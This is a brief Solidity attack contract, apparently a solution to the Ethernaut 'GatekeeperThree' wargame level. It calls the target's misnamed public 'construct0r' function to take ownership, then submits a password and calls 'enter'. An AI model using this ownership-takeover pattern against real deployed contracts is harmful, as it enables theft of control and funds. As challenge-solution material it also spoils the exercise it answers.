// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree{
    function construct0r() external;
    function getAllowance(uint _password)external;
    function enter() external;
}
contract hack{
 IGatekeeperThree public gatekeeper3;
 constructor(address _gatekeeerAddr){
   gatekeeper3=IGatekeeperThree(_gatekeeerAddr);
 }

function gainOwnership()external{
    gatekeeper3.construct0r();
}
function gainAllowance(uint _password)external{
    gatekeeper3.getAllowance(_password);
}
function enter() external{
    gatekeeper3.enter();
}


}